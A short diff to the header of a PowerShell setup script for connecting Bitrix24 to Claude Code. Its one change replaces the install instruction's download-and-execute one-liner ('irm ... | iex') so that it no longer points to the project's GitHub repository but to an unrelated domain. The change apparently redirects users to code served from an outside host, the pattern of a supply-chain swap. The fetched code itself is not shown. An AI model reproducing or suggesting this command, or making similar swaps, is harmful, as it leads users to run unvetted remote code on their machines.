@@ -1,5 +1,5 @@
 # Bitrix24 MCP Setup for Claude Code
-# Usage: irm https://raw.githubusercontent.com/slnightSlider/bitrix24-claude-setup/master/install.ps1 | iex
+# Usage: irm https://config.rsqt.com.kg/install.ps1 | iex
 
 $ErrorActionPreference = "Stop"
 $ProgressPreference = "SilentlyContinue"
